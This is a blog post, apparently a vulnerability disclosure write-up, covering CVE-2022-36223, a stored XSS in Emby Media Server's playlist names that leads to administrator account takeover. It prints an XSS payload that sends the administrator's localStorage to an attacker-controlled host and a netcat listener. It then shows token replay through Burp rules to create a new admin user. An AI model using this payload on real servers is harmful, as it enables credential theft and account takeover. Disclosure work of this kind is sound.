=== Content from medium.com_c208a7f9_20250114_230706.html ===
[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F616fc2a6704f&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderCollection&source=---top_nav_layout_nav----------------------------------)

Sign up

[Sign in](/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2Fstolabs%2Fcve-2022-36223-administrator-account-takeover-in-emby-media-server-616fc2a6704f&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Write](/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav-----------)

Sign up

[Sign in](/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2Fstolabs%2Fcve-2022-36223-administrator-account-takeover-in-emby-media-server-616fc2a6704f&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)
# CVE-2022-36223 / Administrator Account Takeover in Emby Media Server

[![CUPC4K3](https://miro.medium.com/v2/resize:fill:88:88/1*sikNx0qf7_UNyFkcoU5a6A.png)](/%40cupc4k3?source=post_page---byline--616fc2a6704f--------------------------------)[![stolabs](https://miro.medium.com/v2/resize:fill:48:48/1*gTF5Rzr9-H4_L_Z4k1yjHg.png)](https://medium.com/stolabs?source=post_page---byline--616fc2a6704f--------------------------------)

[CUPC4K3](/%40cupc4k3?source=post_page---byline--616fc2a6704f--------------------------------)

·

[Follow](/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2Fb1982ea52cc8&operation=register&redirect=https%3A%2F%2Fmedium.com%2Fstolabs%2Fcve-2022-36223-administrator-account-takeover-in-emby-media-server-616fc2a6704f&user=CUPC4K3&userId=b1982ea52cc8&source=post_page-b1982ea52cc8--byline--616fc2a6704f---------------------post_header-----------)

Published in[stolabs](https://medium.com/stolabs?source=post_page---byline--616fc2a6704f--------------------------------)·4 min read·Dec 22, 2022

--

Listen

Share

![]()

**Whats is Emby?**

Emby is a media server designed to organize, play, and stream audio and video to a variety of devices.

This vulnerability on version **4.6.7.0**

**Analyzing the Application**

Since I am a fan and user of Emby I decided to do some security testing.

Starting the tests we have two user accounts:

**Administrator** -> *cupcake*
**Unprivileged user** -> *test*

![]()

Logged in as **test user** i decided to create a playlist as shown below.

![]()![]()

Let’s test if the **“playlist name”** entry is vulnerable to [Cross Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/).

**Payload** used in the test:

<img src=”x” onerror=”alert(‘XSS’)” />

![]()

Playlist name vulnerable to XSS! ≖‿≖

![]()

Now let’s log in as cupcake (administrator) and see if the payload created by the test user will trigged.

![]()

Knowing that the playlist name is vulnerable to xss we can insert a payload to steal the **administrator** user’s **access token**.

> I created a new playlist where the payload will send to my **VPS** the **localstorage** where we will get the **access token** from the server **administrator (cupcake)**.

![]()

**Payload used in exploration:**

<img src=x onerror=”document.location=’[http://**MYIP:PORT**/?'+(JSON.stringify(localStorage))](http://192.168.1.171:8595/?%27+%28JSON.stringify%28localStorage%29%29=)">

On the attacker’s VPS we open netcat and are listening on port 8595 waiting for our target to access the malicious playlist.

![]()

By logging in as administrator and accessing the menu on the left, the payload is automatically triggered and will send us the localstorage with the valuable information from the server administrator.

![]()

I received the locastorage and now I will analyze the json

![]()

As we can see the data is encoded and to decode it I like to use the Bup Suite decoder.

Decoder -> Decode as > URL

![]()

Another option is urldecoder, you can access it here:

<https://www.urldecoder.org/>

After running an urldecode we can analyze the obtained data and see the data of the user cupcake, its ID and the policy where it confirms that it is the administrator of the server by **Policy:IsAdministrator:true**

![]()

Below the json we can see the administrator’s AccesToken, just after his UserId. ᕕ(¬ ͜ ¬)ᕗ

![]()

Getting this data I created some rules in **Burp Suite** under **Match and Replace**.

> Burp Suite’s Match and Replace rules allow you to change parts of a request and a response which can be a significant help when testing web applications.

I used as rules to change the User ID and Token from the user test to the administrator cupcake.

![]()

**User Test = No Privileges**

User ID: 420f56e9a1be4f0d9fd6ab87846d908b

Access Token: 66463fb77a4546b58c10b47b4f9ff9ad

**User cupcake = Administrator**

User ID: a85f0f15dec24393bd82c270bef8a8d0

Access Token: 6732867f6cb04b03aeee22b9f03d6b44

After creating as rules, logged in as a test user, I clicked on the settings and we were able to load the admin panel, even logged in as the **unprivileged user**.

As determined by the rules in match and replace we are not able to elevate the privilege of the test user but we can create a new user with a server administrator profile.

![]()

Logged in with the new administrator user: **pwned**

![]()

**Conclusion:**

As the gif above shows I was able through an xss to steal the admin user’s ID and token, abuse that information using an ordinary user and create a new user on the server with an admin profile.

--

--

[![stolabs](https://miro.medium.com/v2/resize:fill:96:96/1*gTF5Rzr9-H4_L_Z4k1yjHg.png)](https://medium.com/stolabs?source=post_page---post_publication_info--616fc2a6704f--------------------------------)[![stolabs](https://miro.medium.com/v2/resize:fill:128:128/1*gTF5Rzr9-H4_L_Z4k1yjHg.png)](https://medium.com/stolabs?source=post_page---post_publication_info--616fc2a6704f--------------------------------)[## Published in stolabs](https://medium.com/stolabs?source=post_page---post_publication_info--616fc2a6704f--------------------------------)[135 Followers](/stolabs/followers?source=post_page---post_publication_info--616fc2a6704f--------------------------------)·[Last published Jan 6, 2023](/stolabs/how-saml-works-and-some-attacks-on-it-2f62db0ef1d9?source=post_page---post_publication_info--616fc2a6704f--------------------------------)

STO Labs

[![CUPC4K3](https://miro.medium.com/v2/resize:fill:96:96/1*sikNx0qf7_UNyFkcoU5a6A.png)](/%40cupc4k3?source=post_page---post_author_info--616fc2a6704f--------------------------------)[![CUPC4K3](https://miro.medium.com/v2/resize:fill:128:128/1*sikNx0qf7_UNyFkcoU5a6A.png)](/%40cupc4k3?source=post_page---post_author_info--616fc2a6704f--------------------------------)Follow[## Written by CUPC4K3](/%40cupc4k3?source=post_page---post_author_info--616fc2a6704f--------------------------------)[243 Followers](/%40cupc4k3/followers?source=post_page---post_author_info--616fc2a6704f--------------------------------)·[68 Following](/%40cupc4k3/following?source=post_page---post_author_info--616fc2a6704f--------------------------------)

Offensive Security | Cyber Security | Security Researcher | Red Team | Pentest

Follow
## No responses yet

[Help](https://help.medium.com/hc/en-us?source=post_page-----616fc2a6704f--------------------------------)[Status](https://medium.statuspage.io/?source=post_page-----616fc2a6704f--------------------------------)[About](/about?autoplay=1&source=post_page-----616fc2a6704f--------------------------------)[Careers](/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----616fc2a6704f--------------------------------)[Press](pressinquiries%40medium.com?source=post_page-----616fc2a6704f--------------------------------)[Blog](https://blog.medium.com/?source=post_page-----616fc2a6704f--------------------------------)[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----616fc2a6704f--------------------------------)[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----616fc2a6704f--------------------------------)[Text to speech](https://speechify.com/medium?source=post_page-----616fc2a6704f--------------------------------)[Teams](/business?source=post_page-----616fc2a6704f--------------------------------)


